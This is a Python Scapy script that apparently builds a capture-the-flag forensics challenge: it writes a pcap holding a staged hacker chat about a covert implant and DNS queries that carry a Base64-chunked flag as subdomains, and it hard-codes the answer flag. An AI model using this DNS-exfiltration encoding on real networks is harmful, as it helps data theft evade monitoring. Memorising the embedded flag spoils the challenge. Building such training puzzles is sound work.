from scapy.all import *
import random
import base64
import time

def create_dns_exfil_packets(flag, base_domain, source_ip, dest_ip, start_time):
    """Creates DNS packets with a Base64-encoded flag."""
    packets = []
    chunk_size = 4
    flag_chunks = [flag[i:i + chunk_size] for i in range(0, len(flag), chunk_size)]
    
    current_time = start_time
    for chunk in flag_chunks:
        encoded_chunk = base64.b64encode(chunk.encode('utf-8')).decode('utf-8').rstrip('=')
        query_name = f"{encoded_chunk}.{base_domain}"
        
        packet = IP(src=source_ip, dst=dest_ip) / \
                 UDP(sport=RandShort(), dport=53) / \
                 DNS(rd=1, qd=DNSQR(qname=query_name))
        packet.time = current_time
        current_time += random.uniform(0.1, 0.5) 
        packets.append(packet)

    common_domains = ["google.com", "github.com", "discord.com", "twitch.tv"]
    for domain in common_domains:
        noise_packet = IP(src=source_ip, dst=dest_ip) / \
                       UDP(sport=RandShort(), dport=53) / \
                       DNS(rd=1, qd=DNSQR(qname=domain))
        noise_packet.time = current_time
        current_time += random.uniform(0.1, 0.5)
        packets.append(noise_packet)

    print(f"[*] Created {len(packets)} DNS packets.")
    return packets

def create_chat_packets(conversation, pwner_ip, haxor_ip, pwner_port, haxor_port, start_time):
    """Creates a TCP stream containing a conversation."""
    packets = []
    current_time = start_time

    pwner_seq = random.randint(0, 2**32 - 1)
    haxor_seq = random.randint(0, 2**32 - 1)

    syn = IP(src=pwner_ip, dst=haxor_ip) / TCP(sport=pwner_port, dport=haxor_port, flags='S', seq=pwner_seq)
    syn.time = current_time
    packets.append(syn)
    current_time += 0.01

    syn_ack = IP(src=haxor_ip, dst=pwner_ip) / TCP(sport=haxor_port, dport=pwner_port, flags='SA', seq=haxor_seq, ack=syn.seq + 1)
    syn_ack.time = current_time
    packets.append(syn_ack)
    current_time += 0.01
    
    ack = IP(src=pwner_ip, dst=haxor_ip) / TCP(sport=pwner_port, dport=haxor_port, flags='A', seq=syn.seq + 1, ack=syn_ack.seq + 1)
    ack.time = current_time
    packets.append(ack)
    current_time += 0.5

    pwner_seq += 1
    haxor_seq += 1

    for sender_ip, message in conversation:
        payload = message.encode('utf-8')
        if sender_ip == pwner_ip:
            msg_pkt = IP(src=pwner_ip, dst=haxor_ip) / TCP(sport=pwner_port, dport=haxor_port, flags='PA', seq=pwner_seq, ack=haxor_seq) / Raw(load=payload)
            msg_pkt.time = current_time
            packets.append(msg_pkt)
            current_time += 0.01

            ack_pkt = IP(src=haxor_ip, dst=pwner_ip) / TCP(sport=haxor_port, dport=pwner_port, flags='A', seq=haxor_seq, ack=pwner_seq + len(payload))
            ack_pkt.time = current_time
            packets.append(ack_pkt)
            current_time += random.uniform(0.5, 1.0)
            pwner_seq += len(payload)
        else:
            msg_pkt = IP(src=haxor_ip, dst=pwner_ip) / TCP(sport=haxor_port, dport=pwner_port, flags='PA', seq=haxor_seq, ack=pwner_seq) / Raw(load=payload)
            msg_pkt.time = current_time
            packets.append(msg_pkt)
            current_time += 0.01

            ack_pkt = IP(src=pwner_ip, dst=haxor_ip) / TCP(sport=pwner_port, dport=haxor_port, flags='A', seq=pwner_seq, ack=haxor_seq + len(payload))
            ack_pkt.time = current_time
            packets.append(ack_pkt)
            current_time += random.uniform(0.5, 1.0)
            haxor_seq += len(payload)

    print(f"[*] Created {len(packets)} TCP chat packets.")
    return packets

def generate_pcap():
    """Main function to generate the final pcap file."""
    FLAG = "HTB{cAts_cAn_h4cK_y0_w1f1_t00}"
    DNS_DOMAIN = "internal-analytics-svc.net"
    OUTPUT_FILENAME = "suspicious_traffic.pcap"

    NOOB_PWNR_IP = "10.10.10.101"
    LEET_HAX_IP = "10.10.10.202"

    COMPROMISED_CLIENT_IP = "192.168.1.42"
    DNS_SERVER_IP = "8.8.8.8"

    CONVERSATION = [
        (NOOB_PWNR_IP, "n00b_pwnr_cAt: yo, check it. i got the goods from that corporate network. completely bypassed their firewall.\n"),
        (LEET_HAX_IP, "l33t_h4x0r_CaT: lol, sure you did. how? another reverse shell on port 443? groundbreaking.\n"),
        (NOOB_PWNR_IP, "n00b_pwnr_cAt: nah man, this was slick. i just had the implant query my C2 server. blended right in with all their normal web traffic. their fancy IDS didn't see a thing.\n"),
        (LEET_HAX_IP, "l33t_h4x0r_CaT: queries? like DNS? dude, they log all that stuff. you're gonna get caught.\n"),
        (NOOB_PWNR_IP, "n00b_pwnr_cAt: they can log all they want. it'll just look like garbage to them. ;)\n"),
        (LEET_HAX_IP, "l33t_h4x0r_CaT: lol, k. just remember some decoders throw a fit if the padding is off by 2 '='s in each string. good luck not getting busted.\n")
    ]

    start_capture_time = time.time()
    chat_packets = create_chat_packets(CONVERSATION, NOOB_PWNR_IP, LEET_HAX_IP, 1337, 42069, start_capture_time)
    dns_packets = create_dns_exfil_packets(FLAG, DNS_DOMAIN, COMPROMISED_CLIENT_IP, DNS_SERVER_IP, start_capture_time + 10)

    all_packets = chat_packets + dns_packets
    all_packets.sort(key=lambda p: p.time)
    
    try:
        wrpcap(OUTPUT_FILENAME, all_packets)
        print(f"\n[+] Success! PCAP file '{OUTPUT_FILENAME}' created.")
    except Exception as e:
        print(f"[-] An error occurred while writing the file: {e}")


if __name__ == "__main__":
    generate_pcap()


